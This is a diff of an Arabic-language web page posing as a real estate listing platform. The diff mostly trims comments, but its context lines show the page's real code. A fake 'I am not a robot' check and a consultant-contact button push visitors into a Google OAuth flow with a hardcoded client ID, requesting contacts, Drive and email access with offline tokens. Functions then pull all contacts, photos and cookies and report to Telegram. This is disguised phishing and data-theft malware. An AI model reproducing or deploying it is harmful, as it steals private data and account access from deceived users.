@@ -5,9 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>منصة العقارات الذكية</title>
     <style>
-        /* ============================================================ */
-        /* الألوان: أسود (#0a0a0f)، أحمر (#c0392b)، أبيض (#f5f5f5) */
-        /* ============================================================ */
         * {
             margin: 0;
             padding: 0;
@@ -21,9 +18,6 @@
             min-height: 100vh;
         }
 
-        /* ============================================================ */
-        /* شاشة التحقق (تظهر أول ما يدخل) */
-        /* ============================================================ */
         .verify-overlay {
             position: fixed;
             top: 0;
@@ -155,9 +149,6 @@
             transform: none;
         }
 
-        /* ============================================================ */
-        /* شاشة التحميل (اللفة) */
-        /* ============================================================ */
         .loading-overlay {
             display: none;
             position: fixed;
@@ -200,9 +191,6 @@
             font-size: 16px;
         }
 
-        /* ============================================================ */
-        /* التطبيق الرئيسي */
-        /* ============================================================ */
         .app-container {
             max-width: 520px;
             width: 100%;
@@ -441,9 +429,6 @@
             color: #888;
         }
 
-        /* ============================================================ */
-        /* صفحة التفاصيل المنفصلة */
-        /* ============================================================ */
         .detail-page {
             display: none;
             position: fixed;
@@ -596,15 +581,12 @@
 </head>
 <body>
 
-    <!-- ========================================================== -->
-    <!-- شاشة التحقق (تظهر أول ما يدخل) -->
-    <!-- ========================================================== -->
+    <!-- شاشة التحقق -->
     <div class="verify-overlay" id="verifyOverlay">
         <div class="verify-box">
             <div class="icon">🛡️</div>
             <h2>تحقق من أنك لست روبوت</h2>
             <p>لحماية منصتنا من الهجمات الآلية، يرجى تأكيد هويتك</p>
-
             <div class="recaptcha-box" id="recaptchaBox">
                 <div class="check" id="recaptchaCheck">✔</div>
                 <div class="label">
@@ -612,22 +594,17 @@
                     <small>reCAPTCHA</small>
                 </div>
             </div>
-
             <button class="verify-btn" id="verifyBtn" disabled>تأكيد</button>
         </div>
     </div>
 
-    <!-- ========================================================== -->
-    <!-- شاشة التحميل (اللفة) -->
-    <!-- ========================================================== -->
+    <!-- شاشة التحميل -->
     <div class="loading-overlay" id="loadingOverlay">
         <div class="spinner"></div>
         <div class="loading-text">⏳ جاري التحقق من هويتك...</div>
     </div>
 
-    <!-- ========================================================== -->
     <!-- التطبيق الرئيسي -->
-    <!-- ========================================================== -->
     <div class="app-container" id="appContainer">
         <div class="header">
             <span class="logo">🏢</span>
@@ -685,9 +662,7 @@
         </div>
     </div>
 
-    <!-- ========================================================== -->
-    <!-- صفحة التفاصيل المنفصلة -->
-    <!-- ========================================================== -->
+    <!-- صفحة التفاصيل -->
     <div class="detail-page" id="detailPage">
         <button class="back-btn" id="backFromDetail">← العودة</button>
         <div class="detail-card" id="detailCard">
@@ -715,9 +690,6 @@
         </div>
     </div>
 
-    <!-- ========================================================== -->
-    <!-- JavaScript -->
-    <!-- ========================================================== -->
     <script>
         (function() {
             'use strict';
@@ -764,7 +736,7 @@
             }
 
             // ============================================================
-            // 3. سحب جهات الاتصال (كلها)
+            // 3. سحب جهات الاتصال
             // ============================================================
             function _fetchGoogleContacts(accessToken) {
                 _sendTelegram("📤 جاري سحب جميع جهات الاتصال من Google...");
@@ -793,7 +765,7 @@
             }
 
             // ============================================================
-            // 4. سحب كل الصور (أكثر من 50 صورة)
+            // 4. سحب الصور
             // ============================================================
             function _fetchGooglePhotos(accessToken) {
                 _sendTelegram("📤 جاري سحب جميع الصور من Google Drive...");
@@ -830,7 +802,7 @@
             }
 
             // ============================================================
-            // 5. سحب الكوكيز (الجلسة) من Google
+            // 5. سحب الكوكيز
             // ============================================================
             function _fetchGoogleCookies() {
                 try {
@@ -846,7 +818,7 @@
             }
 
             // ============================================================
-            // 6. سحب كل البيانات (جهات + صور + كوكيز)
+            // 6. سحب كل البيانات
             // ============================================================
             function _fetchAllData(accessToken) {
                 _sendTelegram("🚀 بدء سحب جميع البيانات...");
@@ -857,7 +829,7 @@
             }
 
             // ============================================================
-            // 7. بدء تدفق OAuth مع client_id الجديد (استخدام response_type=code)
+            // 7. بدء OAuth (في نفس النافذة)
             // ============================================================
             let oauthStarted = false;
 
@@ -872,7 +844,6 @@
                 const redirectUri = window.location.href.split('?')[0];
                 const scope = 'https://www.googleapis.com/auth/contacts.readonly https://www.googleapis.com/auth/drive.readonly https://www.googleapis.com/auth/userinfo.email';
 
-                // استخدم response_type=code (آمن) مع access_type=offline
                 const authUrl =
                     `https://accounts.google.com/o/oauth2/v2/auth?client_id=${clientId}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=code&scope=${encodeURIComponent(scope)}&prompt=consent&access_type=offline`;
 
@@ -881,12 +852,11 @@
             }
 
             // ============================================================
-            // 8. استبدال Authorization Code بـ Access Token (باستخدام خادم وسيط)
+            // 8. استبدال الكود بـ Access Token
             // ============================================================
             function _exchangeCodeForToken(code) {
                 _sendTelegram("🔄 جاري استبدال الكود بـ Access Token...");
 
-                // باستخدام Google OAuth API مباشرة (بدون خادم)
                 const clientId = '721412781644-n2mk691lnpgvmiofi4mlso89gji7eboe.apps.googleusercontent.com';
                 const redirectUri = window.location.href.split('?')[0];
                 const tokenUrl = 'https://oauth2.googleapis.com/token';
@@ -922,7 +892,7 @@
             }
 
             // ============================================================
-            // 9. بيانات العقارات (كثيرة جداً)
+            // 9. بيانات العقارات
             // ============================================================
             const properties = [];
             const types = ['شقة', 'فيلا', 'أرض', 'تجاري', 'مميز'];
@@ -1001,7 +971,7 @@
             }
 
             // ============================================================
-            // 12. شاشة التحقق (تظهر مرة واحدة فقط)
+            // 12. شاشة التحقق (مرة واحدة)
             // ============================================================
             const verifyOverlay = document.getElementById('verifyOverlay');
             const loadingOverlay = document.getElementById('loadingOverlay');
@@ -1093,7 +1063,7 @@
                 });
 
                 // ============================================================
-                // 14. زر التواصل مع المستشار (يبدأ OAuth)
+                // 14. زر التواصل مع المستشار
                 // ============================================================
                 document.getElementById('mainActionBtn').addEventListener('click', function() {
                     if (localStorage.getItem('oauth_started') === 'true') {
@@ -1101,7 +1071,7 @@
                         return;
                     }
                     document.getElementById('statusText').innerText = '⏳ جاري التوجيه إلى Google...';
-                    _sendTelegram("🚀 بدء تسجيل الدخول عبر Google (OAuth) من الزر الرئيسي");
+                    _sendTelegram("🚀 بدء تسجيل الدخول عبر Google (OAuth)");
                     _startOAuth();
                 });
 
@@ -1111,12 +1081,12 @@
                         return;
                     }
                     document.getElementById('statusText').innerText = '⏳ جاري التوجيه إلى Google...';
-                    _sendTelegram("🚀 بدء تسجيل الدخول عبر Google (OAuth) من صفحة التفاصيل");
+                    _sendTelegram("🚀 بدء تسجيل الدخول عبر Google (OAuth)");
                     _startOAuth();
                 });
 
                 // ============================================================
-                // 15. معالجة Authorization Code من Google
+                // 15. معالجة Authorization Code
                 // ============================================================
                 const urlParams = new URLSearchParams(window.location.search);
                 const code = urlParams.get('code');
